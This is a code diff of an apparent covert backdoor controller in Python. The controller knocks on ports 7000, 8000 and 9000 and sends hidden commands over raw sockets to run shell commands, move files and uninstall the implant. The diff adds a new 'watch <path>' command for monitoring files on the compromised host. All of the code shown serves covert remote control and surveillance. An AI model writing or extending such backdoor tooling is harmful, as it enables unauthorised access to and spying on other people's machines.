@@ -12,7 +12,7 @@ import struct
 import time
 import sys
 from enum import IntEnum
-from raw_socket_protocol_old import RawSocketProtocol
+from raw_socket_protocol import RawSocketProtocol
 
 # Configuration
 KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
@@ -26,6 +26,7 @@ class CommandType(IntEnum):
     TRANSFER_TO_CLIENT = 0x3456
     TRANSFER_FROM_CLIENT = 0x4567
     RUN_COMMAND = 0x5678
+    FILE_WATCH = 0x6789
     ACK = 0x9ABC
     ERROR = 0xABCD
 
@@ -34,6 +35,7 @@ class CommandType(IntEnum):
 COMMANDS_WITH_RESPONSE = frozenset([
     CommandType.RUN_COMMAND,
     CommandType.TRANSFER_FROM_CLIENT,
+    CommandType.FILE_WATCH,
     CommandType.UNINSTALL,
 ])
 
@@ -275,6 +277,15 @@ class Commander:
                         continue
                     self.send_covert_command(
                         CommandType.RUN_COMMAND,
+                        args.encode('utf-8')
+                    )
+
+                elif cmd == 'watch':
+                    if not args:
+                        print("[!] Usage: watch <path>")
+                        continue
+                    self.send_covert_command(
+                        CommandType.FILE_WATCH,
                         args.encode('utf-8')
                     )
 
